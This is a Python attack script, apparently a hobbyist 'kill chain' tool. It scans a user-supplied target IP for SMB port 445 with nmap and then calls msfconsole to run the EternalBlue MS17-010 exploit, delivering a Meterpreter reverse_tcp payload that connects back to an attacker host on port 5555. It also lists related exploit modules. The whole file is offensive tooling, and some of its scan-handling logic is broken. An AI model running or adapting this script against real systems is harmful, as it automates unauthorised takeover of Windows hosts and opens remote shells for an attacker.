import os
import nmap
#import pymetasploit3
#from scapy.all import *
#from scapy.layers.inet import IP, ICMP

RHOST = input("Enter Target IP Address: ")
RPORT = '445'
LHOST = 'x.x.x.x'    
LPORT = '5555'
PROTO = 'tcp'
PAYLOAD = 'windows/x64/meterpreter/reverse_tcp'
FPATH = 'output.csv'
MODULES = {
    'EternalBlue': 'exploit/windows/smb/ms17_010_eternalblue',
    'MS17': 'auxiliary/scanner/smb/smb_ms17_010',
    'Double_Pulsar_RCE': 'exploit/windows/smb/smb_doublepulsar_rce',
    'Eternal_Romance': 'auxiliary/admin/smb/ms17_010_command',
    'Eternal_Synergy': 'exploit/windows/smb/ms17_010_psexec'
}


banner = ("""
#       ,--.                                                                                            
#   ,--/  /|           ,--,    ,--,               ,----..    ,---,                                      
#,---,': / '  ,--,   ,--.'|  ,--.'|              /   /   \ ,--.' |                  ,--,                
#:   : '/ / ,--.'|   |  | :  |  | :       ,---,.|   :     :|  |  :                ,--.'|         ,---,  
#|   '   ,  |  |,    :  : '  :  : '     ,'  .' |.   |  ;. /:  :  :                |  |,      ,-+-. /  | 
#'   |  /   `--'_    |  ' |  |  ' |   ,---.'   ,.   ; /--` :  |  |,--.  ,--.--.   `--'_     ,--.'|'   | 
#|   ;  ;   ,' ,'|   '  | |  '  | |   |   |    |;   | ;    |  :  '   | /       \  ,' ,'|   |   |  ,"' | 
#:   '   \  '  | |   |  | :  |  | :   :   :  .' |   : |    |  |   /' :.--.  .-. | '  | |   |   | /  | | 
#|   |    ' |  | :   '  : |__'  : |__ :   |.'   .   | '___ '  :  | | | \__\/: . . |  | :   |   | |  | | 
#'   : |.  \'  : |__ |  | '.'|  | '.'|`---'     '   ; : .'||  |  ' | : ," .--.; | '  : |__ |   | |  |/  
#|   | '_\.'|  | '.'|;  :    ;  :    ;          '   | '/  :|  :  :_:,'/  /  ,.  | |  | '.'||   | |--'   
#'   : |    ;  :    ;|  ,   /|  ,   /           |   :    / |  | ,'   ;  :   .'   \;  :    ;|   |/       
#;   |,'    |  ,   /  ---`-'  ---`-'             \   \ .'  `--''     |  ,     .-./|  ,   / '---'        
#'---'       ---`-'                               `---`               `--`---'     ---`-'               
# 
# 
# By Dallin Baird
#                                                                                                      
""")
print(banner)

# Reconnaisance 
def recon():
    try:
        nm = nmap.PortScanner()
        scan = nm.scan(RHOST, RPORT) 
        nm.command_line()
        nm.scaninfo()
        results = scan['scan']['x.x.x.x'][PROTO][445]['state']
    except KeyError as exkey:
        print("[!] Cannot scan host!: " + RHOST)
    #print(results)
    log_to_file(results)
    log_to_file(scan) 
    # Checks for open port on 445
    if results ==('open'): 
        print('\n[!] Port 445 on ' + RHOST + ' is running  [!] \n[!] Loading EternalBlue [!]\n')
        return True
        
    else:
        print('Port 445 is closed.')
        return False
       
#Exploitation
def eb(module, msfmodule, file_path, var_payload, recv_host, recv_port, target_ip):
    # Summons metasploit and loads exploit/ms17 module. Turns spool on and specifies output location, set exploit variables & exploit
    cmd = os.system("msfconsole -q -x 'use '" + module[msfmodule] + "';  spool '" + file_path + "';  set payload '" + var_payload + "';  set LHOST '" + recv_host + "'; set LPORT '" + recv_port + "'; set RHOST '" + target_ip + "'; exploit'")
        
    
  
# Logging in .csv format
def log_to_file(message):
    with open(FPATH, 'a') as fd:
      fd.write(f'{message}\r\n\n\n') 
      

initial = recon()
if initial == True:
    eb(MODULES, 'EternalBlue', FPATH, PAYLOAD, LHOST, LPORT, RHOST)
    

